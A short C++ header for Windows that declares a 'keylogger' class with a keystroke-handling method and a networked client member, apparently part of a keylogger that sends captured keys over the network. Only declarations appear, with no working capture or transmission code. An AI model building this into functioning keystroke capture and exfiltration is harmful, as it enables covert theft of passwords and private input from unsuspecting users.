#pragma once

#ifdef _WIN32
#define _WIN32_WINNT 0x0A00
#endif

#include "WinSock2.h"
#include <Windows.h>
#include <fstream>
#include <iostream>

#include "client_keylogger.h"
#include "common.h"
#include "kqnet.h"

class keylogger {
  public:
    keylogger();
    ~keylogger();
    void handleKeyStroke(DWORD virtualKeyCode, keyStatus status, bool caps);

  private:
    client_keylogger client;
};